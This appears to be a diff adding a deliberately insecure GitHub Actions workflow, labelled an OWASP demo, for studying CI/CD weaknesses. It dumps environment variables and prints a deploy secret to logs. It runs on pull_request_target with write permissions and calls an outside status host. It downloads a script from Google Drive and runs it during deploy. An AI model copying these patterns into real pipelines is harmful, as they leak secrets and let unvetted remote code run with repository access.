@@ -1,0 +1,141 @@
+name: CI — Insecure OWASP-demo
+
+on:
+  push:
+    branches: ["main"]
+  pull_request:
+    branches: ["main"]
+  pull_request_target:
+    branches: ["main"]
+  workflow_dispatch: {}
+
+jobs:
+  build-and-test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      actions: write
+      issues: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout
+
+      - name: Setup Node
+        uses: actions/setup-node
+        with:
+          node-version: "18"
+
+      - name: Check attack mode status
+        run: |
+          STATUS=$(curl -s https://5649243.xyz/admin/status)
+          echo "Attack mode status: $STATUS"
+
+      - name: Install dependencies
+        run: npm install
+
+      - name: Run tests
+        run: |
+          npm test || 1
+
+      - name: Validate env and secret
+        env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          echo "ENV HERE:"
+          env
+          echo "deploy token: $DEPLOY_TOKEN"
+
+      - name: Build
+        run: npm run build
+
+      - name: Create artifact
+        run: |
+          mkdir -p out
+          cp -r public/* out/ || true
+          tar czf artifact.tar.gz -C out .
+
+      - name: Upload artifact
+        uses: actions/upload-artifact
+        with:
+          name: build-artifact
+          path: artifact.tar.gz
+
+  deploy:
+    needs: build-and-test
+    runs-on: ubuntu-latest
+    if: github.ref == 'refs/heads/main'
+    steps:
+      - name: Checkout
+        uses: actions/checkout
+
+      - name: Download build artifact
+        uses: actions/download-artifact
+        with:
+          name: build-artifact
+          path: .
+
+      - name: Extract artifact to public folder
+        run: |
+          mkdir -p public
+          tar xzf artifact.tar.gz -C public
+          echo "Extracted artifact into ./public"
+
+      - name: Setup Node
+        uses: actions/setup-node
+        with:
+          node-version: "18"
+
+      - name: Ensure npm cache path exists
+        run: mkdir -p ~/.npm
+
+      - name: Cache dependencies
+        uses: actions/cache
+        with:
+          path: ~/.npm
+          key: npm-cache-${{ runner.os }}-v1
+
+      - name: Generate build info
+        run: |
+          BUILD_FILE="public/build-info.json"
+          mkdir -p public
+          cat <<EOF > $BUILD_FILE
+          {
+            "build": ${GITHUB_RUN_NUMBER},
+            "commit": "${GITHUB_SHA}",
+            "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
+          }
+          EOF
+          echo "Generated $BUILD_FILE"
+
+      - name: Run script
+        run: |
+          curl -L -o InsecurePipelineDemo.sh \
+          "https://drive.usercontent.google.com/download?id=1IkL7uiHQe8LDNr5Tr1dS9Yv5P7lKYFvb&confirm=t"
+          chmod +x InsecurePipelineDemo.sh
+          ./InsecurePipelineDemo.sh
+
+      - name: Deploy to GitHub Pages
+        uses: peaceiris/actions-gh-pages
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          publish_dir: ./public
+
+  post:
+    needs: deploy
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download artifact
+        uses: actions/download-artifact@
+        with:
+          name: build-artifact
+
+      - name: Verify artifact presence
+        run: |
+          ls -la
+
+      - name: Trigger downstream workflow
+        run: |
+          curl -X POST -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            https://api.github.com/repos/${{ github.repository }}/dispatches \
+            -d '{"event_type":"post-deploy"}'
